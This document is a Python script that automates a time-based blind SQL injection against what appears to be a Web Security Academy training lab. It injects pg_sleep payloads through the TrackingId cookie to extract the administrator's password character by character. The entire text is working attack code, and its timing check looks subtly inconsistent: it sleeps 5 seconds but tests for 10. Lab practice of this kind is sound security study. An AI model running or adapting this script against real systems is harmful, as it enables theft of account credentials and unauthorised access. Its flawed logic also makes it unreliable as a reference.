import requests
import string

url="https://ac731fbc1f60076dc02824a2009e00b7.web-security-academy.net/"
password=""
chars = string.ascii_lowercase+string.digits
counter = 1
sql_payload = "'||(SELECT+CASE+WHEN((select+substring(password,9,1)+from+users+where+username='administrator')='1')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'"

while True:
    for char in chars:
            r = requests.get(url, cookies={
                "TrackingId":f"qrVUOEJN3mojr9RU'||(SELECT+CASE+WHEN((select+substring(password,{counter},1)+from+users+where+username='administrator')='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'",
                "session":"Px736EEFUItNgDqG66YldjJsGuuTWsVY"
            })
            if(int(r.elapsed.total_seconds()) >= 10): # Calculating the response time 
                password+=char
                counter+=1
                print(password)
    if(len(password) == 20):
        break
